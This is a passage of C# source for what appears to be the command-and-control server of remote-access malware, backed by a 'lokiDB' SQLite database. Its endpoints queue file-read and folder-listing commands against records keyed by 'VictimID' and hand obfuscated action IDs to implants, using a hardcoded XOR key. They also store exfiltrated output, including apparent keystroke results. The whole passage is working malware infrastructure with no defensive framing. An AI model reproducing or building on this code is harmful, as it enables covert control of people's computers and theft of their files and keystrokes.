            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "SELECT * FROM Action WHERE VictimID = @VictimID AND ActionID = 26 ORDER BY ID DESC LIMIT 1";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        return "true";
                    }
                }
            }
            return "false";
        }

        [HttpPost("DoAction")]
        public string DoAction([FromBody] DoRequest request)
        {
            string host = Request.Host.Value;
            string XAppTimestamp = Request.Headers["X-App-Timestamp"];
            string XAppSignature = Request.Headers["X-App-Signature"];
            string url = "/Action/DoAction";
            string decryptedActionID;
            if (Utils.validateAPIRequest(XAppTimestamp, XAppSignature, url, Request.Method))
            {
                if(request.actionID != "10Special")
                {
                    decryptedActionID = Utils.XOR(request.actionID, "S12Secret");
                }
                else
                {
                    decryptedActionID = "10";
                }
                //string decryptedID = Utils.XOR(request.id, "S12Secret");

                SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
                conn.Open();
                string query = "SELECT * FROM Action WHERE VictimID = @VictimID AND ActionID = @ActionID";

                using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
                {
                    cmd.Parameters.AddWithValue("@VictimID", request.id);
                    cmd.Parameters.AddWithValue("@ActionID", decryptedActionID);

                    using (SQLiteDataReader reader = cmd.ExecuteReader())
                    {
                        if (reader.Read())
                        {
                            string parameters = reader["Parameters"].ToString();
                            return parameters;
                        }
                    }
                }
            }
            return "";
        }

        [HttpPost("KeyResult")]
        public string KeyResult([FromBody] KeyResultRequest request)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Output (VictimID, ActionID ,Output) VALUES (@VictimID, 26 ,@Output)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@Output", request.result);
                cmd.ExecuteNonQuery();
            }
            return "";
        }


        [HttpPost("Frontend")]
        public string sendFileSytem(victimRequest request)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");   
            conn.Open();
            string query = "SELECT Output FROM Output WHERE VictimID = @VictimID AND ActionID = 17 ORDER BY ID DESC LIMIT 1";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.victimID);
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        string output = reader["Output"].ToString();
                        return output;
                    }
                }
            }
            return "";
        }

        [HttpPost("ReadFile")]
        public string ReadFile([FromBody] ReadFileRequest request)
        {
            string host = Request.Host.Value;
            string XAppTimestamp = Request.Headers["X-App-Timestamp"];
            string XAppSignature = Request.Headers["X-App-Signature"];
            string url = "/Action/ReadFile";
            
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 18, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "path=" +request.path);
                cmd.ExecuteNonQuery();
                return "File read request sent";
            }
            return "";
        }

        [HttpPost]
        [Route("Folder")]
        public string FolderContent([FromBody] FolderContentRequest request)
        {
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string query = "INSERT INTO Action (VictimID, ActionID, Date ,Parameters) VALUES (@VictimID, 17, @DateNow ,@Parameters)";
            using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
            {
                cmd.Parameters.AddWithValue("@VictimID", request.id);
                cmd.Parameters.AddWithValue("@DateNow", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                cmd.Parameters.AddWithValue("@Parameters", "path=" + request.path);
                cmd.ExecuteNonQuery();
                return "Folder content request sent";
            }
            return "";
        }

        // Same using SecretOperation
        [HttpPost("SecretOperation")]
        public string SecretOperation([FromBody] DoRequest request)
        {
            string host = Request.Host.Value;
            string XAppTimestamp = Request.Headers["X-App-Timestamp"];
            string XAppSignature = Request.Headers["X-App-Signature"];
            string url = "/Action/SecretOperation";
            string decryptedActionID;
            if (Utils.validateAPIRequest(XAppTimestamp, XAppSignature, url, Request.Method))
            {
                if(request.actionID != "10Special")
                {
                    decryptedActionID = Utils.decryptSecretOperation(request.actionID);
                }
                else
                {
                    decryptedActionID = "10";
                }
                string decryptedID = Utils.decryptSecretOperation(request.id);

                SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
                conn.Open();
                    string query = "SELECT * FROM Action WHERE VictimID = @VictimID AND ActionID = @ActionID ORDER BY ID DESC LIMIT 1";

                using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
                {
                    cmd.Parameters.AddWithValue("@VictimID", decryptedID);
                    cmd.Parameters.AddWithValue("@ActionID", decryptedActionID);

                    using (SQLiteDataReader reader = cmd.ExecuteReader())
                    {
                        if (reader.Read())
                        {
                            string parameters = reader["Parameters"].ToString();
                            return parameters;
                        }
                    }
                }
            }
            return "";
        }
    }
}
